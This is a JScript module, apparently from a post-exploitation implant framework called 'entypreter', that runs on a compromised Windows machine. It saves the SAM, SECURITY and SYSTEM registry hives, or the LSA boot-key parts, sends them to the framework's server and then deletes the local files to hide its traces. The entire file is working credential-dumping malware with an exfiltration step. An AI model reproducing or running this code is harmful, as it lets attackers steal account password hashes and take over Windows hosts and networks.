function GetSysKey()
{
    var jdpath = entypreter.file.getPath("~RPATH~\\42JD");
    var skew1path = entypreter.file.getPath("~RPATH~\\42Skew1");
    var gbgpath = entypreter.file.getPath("~RPATH~\\42GBG");
    var datapath = entypreter.file.getPath("~RPATH~\\42Data");

    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD" + " " + jdpath + " /y", false);
    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1" + " " + skew1path + " /y", false);
    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG" + " " + gbgpath + " /y", false);
    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);

    var data = entypreter.file.readBinary(jdpath);
    data += entypreter.file.readBinary(skew1path);
    data += entypreter.file.readBinary(gbgpath);
    data += entypreter.file.readBinary(datapath);

    var headers = {};
    headers["Task"] = "SysKey";

    if (entypreter.user.encoder == "936")
    {
        //do nothing
    }
    else
    {
        data = data.replace(/\\/g, "\\\\");
        data = data.replace(/\0/g, "\\0");
    }

    try
    {
        headers["encoder"] = entypreter.user.encoder();
    }
    catch (e)
    {
        headers["encoder"] = "1252";
    }

    entypreter.work.report(data, headers);
    entypreter.file.deleteFile(jdpath);
    entypreter.file.deleteFile(skew1path);
    entypreter.file.deleteFile(gbgpath);
    entypreter.file.deleteFile(datapath);
}

function DumpHive(name, uuid)
{
    var path = entypreter.file.getPath("~RPATH~\\" + uuid);

    entypreter.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);

    entypreter.http.upload(path, name, "Task");
    entypreter.file.deleteFile(path);
}

try
{
    DumpHive("SAM", "42SAM");
    DumpHive("SECURITY", "42SECURITY");
    if (~GETSYSHIVE~)
    {
        DumpHive("SYSTEM", "42SYSTEM");
    }
    else
    {
        GetSysKey();
    }

    entypreter.work.report("Complete");
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
